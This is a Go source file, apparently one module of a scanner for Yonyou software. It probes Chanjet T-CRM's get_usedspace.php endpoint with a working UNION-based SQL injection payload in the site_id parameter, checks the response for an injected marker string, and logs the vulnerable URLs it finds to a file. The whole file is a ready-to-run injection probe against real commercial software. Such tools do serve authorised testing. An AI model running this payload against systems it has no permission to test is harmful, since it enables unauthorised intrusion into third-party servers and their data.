package Scan

import (
	"fmt"
	"fupo_for_yonyou/Utils"
	"io/ioutil"
	"net/http"
	"strings"
	"time"
)

func GetusedspacesqlScan(address string, client *http.Client, Red string, Green string, Yellow string, Reset string, Cyan string, currentTime string) {
	getusedspacesql := "用友 畅捷通T-CRM get_usedspace.php SQL注入漏洞"
	urls := address + "/webservice/get_usedspace.php?site_id=-1159%20UNION%20ALL%20SELECT%20CONCAT(0x6f6c6436,0x6f6c6436,0x6f6c6436)--"
	response, err := client.Get(urls)
	if err != nil {
		if strings.Contains(err.Error(), "An existing connection was forcibly closed by the remote host") || strings.Contains(err.Error(), "forcibly closed") {
			fmt.Printf("[%s%s%s] [%s-%s] %s 扫描时连接被目标服务器阻断\n", Cyan, currentTime, Reset, Yellow, Reset, getusedspacesql)
		} else {
			fmt.Printf("[%s%s%s] [%s-%s] %s 扫描时连接被重置\n", Cyan, currentTime, Reset, Yellow, Reset, getusedspacesql)
		}
		return
	}
	defer response.Body.Close()
	body17, err := ioutil.ReadAll(response.Body)
	if err != nil {
		output := fmt.Sprintf("[%s%s%s] [%s-%s] %s 读取响应内容失败: %v", Cyan, currentTime, Reset, Yellow, Reset, getusedspacesql, err)
		fmt.Println(output)
		return
	}
	if strings.Contains(string(body17), "old6old6old6") {
		result10 := getusedspacesql + "：" + urls
		//保存文件不能用传来的currentTime，得重新定义一个格式的时间戳
		timestamp := time.Now().Format("20230712")
		filename := fmt.Sprintf("scan_result_%s.txt", timestamp)
		err := Utils.SaveResultToFile(result10, filename) // 保存结果到文本文件
		if err != nil {
			output := fmt.Sprintf("[%s%s%s] [%s-%s] 保存结果到文件出错: %v", Cyan, currentTime, Reset, Yellow, Reset, err)
			fmt.Println(output)
		}
		output := fmt.Sprintf("[%s%s%s] [%s+%s] 存在%s：%s", Cyan, currentTime, Reset, Green, Reset, getusedspacesql, urls)
		fmt.Println(output)
	} else {
		output := fmt.Sprintf("[%s%s%s] [%s-%s] 不存在%s 响应码: %d", Cyan, currentTime, Reset, Yellow, Reset, getusedspacesql, response.StatusCode)
		fmt.Println(output)
	}
}
